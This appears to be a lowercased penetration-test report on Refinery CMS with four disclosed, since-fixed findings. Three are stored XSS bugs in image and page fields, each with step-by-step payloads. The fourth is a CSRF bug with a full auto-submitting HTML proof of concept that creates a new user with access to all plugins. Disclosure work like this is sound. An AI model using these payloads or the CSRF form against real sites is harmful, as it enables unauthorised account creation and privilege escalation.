[
  "pt-rcms-001: stored xss in the title text in the image upload (medium) it seems that the display engine i.e. wysiwyg used in the refinery cms is not properly sanitizing the html entities before displaying them on the page. this issue is addressed in the github. https://github.com/refinery/refinerycms/issues/3097 the commit link which fixed the issue. https://github.com/refinery/refinerycms/commit/ed05cf9ccb4cb1603e62d99b40af097993fba4e4 the steps to produce the vulnerability are 1. log in the refinery cms. 2. go to image tabs. 3. click on add new image. 4. select an image to upload. 5. in the title box insert the xss payload. 6. write anything in the alt box. 7. click on save button. 8. move mouse pointer over the info icon found below the uploaded image. 9. we can see that the xss payload gets executed. the xss payload used '<marquee onscroll=confirm(1)>xss' 5 | p a g e the below image shows the vulnerable fields. these images shows the payload and the xss in action. 6 | p a g e the xss payload being executed.",
  "pt-rcms-002: stored xss in the alt text in the image upload (medium) this vulnerability is same as pt-rcms-001 but in a different location. this issue is addressed in the github https://github.com/refinery/refinerycms/issues/3097 the commit link which fixed the issue. https://github.com/refinery/refinerycms/commit/ed05cf9ccb4cb1603e62d99b40af097993fba4e4 the steps to produce the vulnerability are 1. log in the refinery cms. 2. go to image tabs. 3. click on add new image. 4. select an image to upload. 5. write anything in the title box. 6. in the alt box insert the xss payload. 7. click on save button. 8. move mouse pointer over the info icon found below the uploaded image. 9. we can see that the xss payload gets executed. the xss payload used '<marquee onscroll=confirm(2)>xss' the below image shows the payload. 8 | p a g e the below image shows the execution of xss payload",
  "pt-rcms-003: stored xss in the title of the add new page (medium) this issue is addressed in the github. https://github.com/refinery/refinerycms/issues/3097 the steps to produce the vulnerability are 1. log in the refinery cms. 2. go to pages tabs. 3. click on add new page. 4. insert the xss payload in the title box. 5. write anything in the body. 6. click on save button. 7. open the saved pages in the new browser window and we can see that the xss payload gets executed. the xss payload used <img src=x onerror=confirm(2)/> the xss vulnerable field is shown in below image. the below image shows the payload. 10 | p a g e the below image shows the payload in action.",
  "pt-rcms-004: cross site request forgery on multiple events. during testing i found that the anti csrf token used in the form field is not verified properly to process the forms. the forms are processed even though the authenticity_token is left blank this resulted in the csrf vulnerability. this issue was addressed in github. https://github.com/refinery/refinerycms/issues/3098 this is the link to the commit which fixed the issues. https://github.com/refinery/refinerycms/commit/9fd5a8b5e98827431add4a4c997286f10092cb9c the proof of concept poc.html is <html> <!-- csrf poc - add new account --> <body> <form name=\"csrf\" id=\"csrf\" action=\"http://localhost:3000/refinery/users\" method=\"patch\"> <!-- change the action value according to the server--> <input type=\"hidden\" name=\"utf8\" value=\"a\\x9c\\x93\" /> <input type=\"hidden\" name=\"authenticity_token\" value=\"\" /> <input type=\"hidden\" name=\"user[username]\" value=\"csrf\" /> <input type=\"hidden\" name=\"user[full_name]\" value=\"csrf\" /> <input type=\"hidden\" name=\"user[email]\" value=\"csrf@csrf.com\" /> <input type=\"hidden\" name=\"user[password]\" value=\"csrf\" /> <input type=\"hidden\" name=\"user[password_confirmation]\" value=\"csrf\" /> <input type=\"hidden\" name=\"user[plugins][]\" value=\"refinery_files\" /> <input type=\"hidden\" name=\"user[plugins][]\" value=\"refinery_images\" /> <input type=\"hidden\" name=\"user[plugins][]\" value=\"refinery_pages\" /> <input type=\"hidden\" name=\"user[plugins][]\" value=\"refinery_authentication_devise\" /> <input type=\"submit\" value=\"submit form\" /> </form> <script>document.getelementbyid(\"csrf\").submit();</script> </body> </html> when a logged in administrator opens the poc.html a new user (csrf) is created with permission to access all plugins. this exploit can be used by least privilege users to elevate to the administrator level or for deletion of an existing user, creation of new user with full permissions to access all the plugins."
]